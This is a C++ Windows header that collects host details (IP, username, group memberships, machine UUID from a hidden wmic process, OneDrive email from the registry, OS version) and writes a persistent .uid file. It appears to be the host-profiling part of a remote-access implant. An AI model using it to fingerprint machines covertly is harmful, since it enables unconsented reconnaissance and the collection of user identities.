#pragma once

#include <map>
#include <string>
#include <chrono>
#include <ctime>
#include <functional>
#include <windows.h>
#include <lm.h>
#include <iostream>
#include "helpers.hpp"
#include <Wbemidl.h>
#include <comdef.h>
#include <winternl.h>

#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "ws2_32.lib")


std::string GetLocalIP() {
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
		return "";

	char hostName[255];
	gethostname(hostName, sizeof(hostName));
	struct hostent* host = gethostbyname(hostName);

	std::string ip = inet_ntoa(*reinterpret_cast<struct in_addr*>(host->h_addr_list[0]));

	WSACleanup();
	return ip;
}


std::wstring GetCurrentUsername() {
	DWORD bufferSize = 0;
	GetUserNameW(NULL, &bufferSize);  // Get required buffer size

	std::wstring username(bufferSize, L'\0');
	if (!GetUserNameW(&username[0], &bufferSize)) {
		return L"";
	}

	// Remove the null character that GetUserNameW might add.
	username.erase(std::find(username.begin(), username.end(), L'\0'), username.end());

	return username;
}


std::vector<std::string> GetUserLocalGroups() {

	std::wstring username = GetCurrentUsername();
	if (username.empty()) {
		std::cerr << "Failed to get the current username." << std::endl;
		return {};
	}

	std::vector<std::string> groupNames;
	DWORD dwLevel = 0;
	DWORD dwFlags = LG_INCLUDE_INDIRECT;
	LPWSTR user = const_cast<LPWSTR>(username.c_str());
	LPLOCALGROUP_USERS_INFO_0 pBuf = NULL;
	DWORD dwEntriesRead = 0;
	DWORD dwTotalEntries = 0;

	NET_API_STATUS nStatus = NetUserGetLocalGroups(NULL, user, dwLevel, dwFlags, (LPBYTE*)&pBuf, MAX_PREFERRED_LENGTH, &dwEntriesRead, &dwTotalEntries);
	if (nStatus == NERR_Success) {
		for (DWORD i = 0; i < dwEntriesRead; i++) {
			if (pBuf[i].lgrui0_name) {
				groupNames.push_back(WStringToString(pBuf[i].lgrui0_name));
			}
		}
	}

	if (pBuf != NULL) {
		NetApiBufferFree(pBuf);
	}

	return groupNames;
}


std::string VectorToString(const std::vector<std::string>& vec) {
	std::string result = "[";
	for (const auto& str : vec) {
		result += "\"" + str + "\", ";
	}
	if (vec.size() > 0) {
		result.pop_back();
		result.pop_back();
	}
	result += "]";
	return result;
}


std::string GetUUID() {
	char uuid[100] = { 0 };
	SECURITY_ATTRIBUTES sa;
	sa.nLength = sizeof(sa);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;

	HANDLE hRead, hWrite;
	if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
		return "";
	}

	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	si.hStdError = hWrite;
	si.hStdOutput = hWrite;
	si.hStdInput = hRead;
	si.dwFlags |= STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;

	ZeroMemory(&pi, sizeof(pi));

	WCHAR cmd[] = L"wmic csproduct get uuid";
	if (!CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
		CloseHandle(hWrite);
		CloseHandle(hRead);
		return "";
	}

	WaitForSingleObject(pi.hProcess, INFINITE);
	DWORD bytesRead;
	if (!ReadFile(hRead, uuid, sizeof(uuid) - 1, &bytesRead, NULL) || bytesRead == 0) {
		CloseHandle(hWrite);
		CloseHandle(hRead);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return "";
	}

	CloseHandle(hWrite);
	CloseHandle(hRead);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

	std::string uuidStr(uuid);

	// Remove "UUID" prefix and any leading whitespace
	std::size_t pos = uuidStr.find("UUID");
	if (pos != std::string::npos) {
		uuidStr = uuidStr.substr(pos + 4); // Removes "UUID"
	}

	// Trim leading and trailing spaces, and null characters.
	uuidStr.erase(uuidStr.begin(), std::find_if(uuidStr.begin(), uuidStr.end(), [](unsigned char ch) {
		return !std::isspace(ch) && ch != '\0';
		}));
	uuidStr.erase(std::find_if(uuidStr.rbegin(), uuidStr.rend(), [](unsigned char ch) {
		return !std::isspace(ch) && ch != '\0';
		}).base(), uuidStr.end());

	return uuidStr;
}


void SaveUIDToFile(const std::wstring& uid) {
	// Get the temporary directory path and append the .uid filename
	std::string pubDir = PublicDir();
	const std::wstring fullpath = std::wstring(pubDir.begin(), pubDir.end()) + L".uid";

	std::wofstream outfile(fullpath);
	if (outfile.is_open()) {
		outfile << uid;
		outfile.close();
	}
	else {
		std::cerr << "Failed to open .uid file for writing." << std::endl;
	}
}


std::string OneDriveEmail() {
	// Define a handle for the registry key:
	HKEY hKey;
	// Path to the OneDrive account info in the Windows registry:
	const char* regPath = "SOFTWARE\\Microsoft\\OneDrive\\Accounts\\Personal";
	// Buffer to hold the user email address:
	char userEmailAddr[256];

	// Variable to hold the size of userEmailAddr buffer:
	DWORD userEmailAddrSize = sizeof(userEmailAddr);
	// Attempt to open the registry key:
	long lResult = RegOpenKeyExA(HKEY_CURRENT_USER, regPath, 0, KEY_READ, &hKey);

	// Check if the key was opened successfully:
	if (lResult == ERROR_SUCCESS) {
		// Query the registry to get the "UserEmail" value:
		lResult = RegQueryValueExA(hKey, "UserEmail", NULL, NULL, (LPBYTE)userEmailAddr, &userEmailAddrSize);
		// Close the opened registry key:
		RegCloseKey(hKey);
		// Check if the email value was retrieved successfully:
		if (lResult == ERROR_SUCCESS) {
			return std::string(userEmailAddr);
		}
	}
	return "";
}


std::string GetOSName() {
	HRESULT hres = CoInitializeEx(0, COINIT_MULTITHREADED);
	if (FAILED(hres)) {
		std::cerr << "CoInitializeEx failed with error " << std::hex << hres << std::endl;
		return "";
	}

	hres = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
	if (FAILED(hres)) {
		std::cerr << "CoInitializeSecurity failed with error " << std::hex << hres << std::endl;
		CoUninitialize();
		return "";
	}

	IWbemLocator* pLoc = NULL;
	hres = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
	if (FAILED(hres)) {
		std::cerr << "CoCreateInstance failed with error " << std::hex << hres << std::endl;
		CoUninitialize();
		return "";
	}

	IWbemServices* pSvc = NULL;
	hres = pLoc->ConnectServer(_bstr_t(L"ROOT\\CIMV2"), NULL, NULL, 0, NULL, 0, 0, &pSvc);
	if (FAILED(hres)) {
		std::cerr << "ConnectServer failed with error " << std::hex << hres << std::endl;
		pLoc->Release();
		CoUninitialize();
		return "";
	}

	hres = CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
	if (FAILED(hres)) {
		std::cerr << "CoSetProxyBlanket failed with error " << std::hex << hres << std::endl;
		pSvc->Release();
		pLoc->Release();
		CoUninitialize();
		return "";
	}

	IEnumWbemClassObject* pEnumerator = NULL;
	hres = pSvc->ExecQuery(bstr_t("WQL"), bstr_t("SELECT * FROM Win32_OperatingSystem"), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnumerator);
	if (FAILED(hres)) {
		std::cerr << "ExecQuery failed with error " << std::hex << hres << std::endl;
		pSvc->Release();
		pLoc->Release();
		CoUninitialize();
		return "";
	}

	IWbemClassObject* pclsObj = NULL;
	ULONG uReturn = 0;
	std::string osName = "";

	while (pEnumerator) {
		HRESULT hr = pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);
		if (0 == uReturn) {
			break;
		}

		VARIANT vtProp;
		hr = pclsObj->Get(L"Caption", 0, &vtProp, 0, 0);
		if (FAILED(hr)) {
			std::cerr << "Get failed with error " << std::hex << hr << std::endl;
		}
		else {
			osName = WStringToString(vtProp.bstrVal);
			VariantClear(&vtProp);
		}
		pclsObj->Release();
	}

	if (pEnumerator) {
		pEnumerator->Release();
	}
	if (pSvc) {
		pSvc->Release();
	}
	if (pLoc) {
		pLoc->Release();
	}
	CoUninitialize();

	return osName;
}


std::map<std::string, std::string> OSInfo() {
	std::map<std::string, std::string> info;
	HMODULE hMod = GetModuleHandleW(L"ntdll.dll");

	if (hMod) {
		typedef NTSTATUS(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
		RtlGetVersionPtr fxPtr = (RtlGetVersionPtr)GetProcAddress(hMod, "RtlGetVersion");
		if (fxPtr != nullptr) {
			RTL_OSVERSIONINFOW rovi = { 0 };
			rovi.dwOSVersionInfoSize = sizeof(rovi);
			if (NT_SUCCESS(fxPtr(&rovi))) {
				info["os_version"] = WStringToString(std::to_wstring(rovi.dwMajorVersion)) + "." +
					WStringToString(std::to_wstring(rovi.dwMinorVersion)) + "." +
					WStringToString(std::to_wstring(rovi.dwBuildNumber));
			}
		}
	}

	SYSTEM_INFO si;
	ZeroMemory(&si, sizeof(SYSTEM_INFO));
	GetSystemInfo(&si);

	info["os_arch"] = si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ? "64-bit" :
		si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL ? "32-bit" : "unknown";

	HKEY hKey;
	std::string osName = GetOSName();

	if (!osName.empty()) {
		info["os_name"] = osName;
	}
	else {
		// if there is an issue with wmi, we set os_name to windows as a default
		info["os_name"] = "Windows";			
	}

	return info;
}



std::map<std::string, std::string> Profiler() {
	std::map<std::string, std::string> OSInfoDict = OSInfo();
	std::map<std::string, std::string> data;
	char buffer[256];
	DWORD size = 256;

	if (GetComputerNameA(buffer, &size)) {
		data["hostname"] = buffer;
	}

	if (GetUserNameA(buffer, &size)) {
		data["username"] = buffer;
	}

	// Getting current time as a string
	auto now = std::chrono::system_clock::now();
	std::time_t currentTime = std::chrono::system_clock::to_time_t(now);
	std::tm localTimeStruct;
	localtime_s(&localTimeStruct, &currentTime);
	char timeStr[100];
	strftime(timeStr, sizeof(timeStr), "%Y-%m-%d %H:%M:%S", &localTimeStruct);

	// Getting UUID
	std::string serialNumber = GetUUID(); 
	std::string uidToSave;

	if (!serialNumber.empty()) {
		data["uid"] = serialNumber; 
		uidToSave = serialNumber; 
	}
	else {
		std::hash<std::string> stringHasher; 
		std::string timeStr = std::to_string(std::chrono::system_clock::now().time_since_epoch().count()); 
		uidToSave = std::to_string(stringHasher(timeStr)); 
		data["uid"] = uidToSave;
	}

	SaveUIDToFile(StringToWString(uidToSave));

	data["local_ip"] = GetLocalIP();
	data["local_groups"] = VectorToString(GetUserLocalGroups());
	data["email"] = OneDriveEmail();
	data["os_name"] = OSInfoDict["os_name"];
	data["os_version"] = OSInfoDict["os_version"];
	data["os_arch"] = OSInfoDict["os_arch"];

	return data;
}
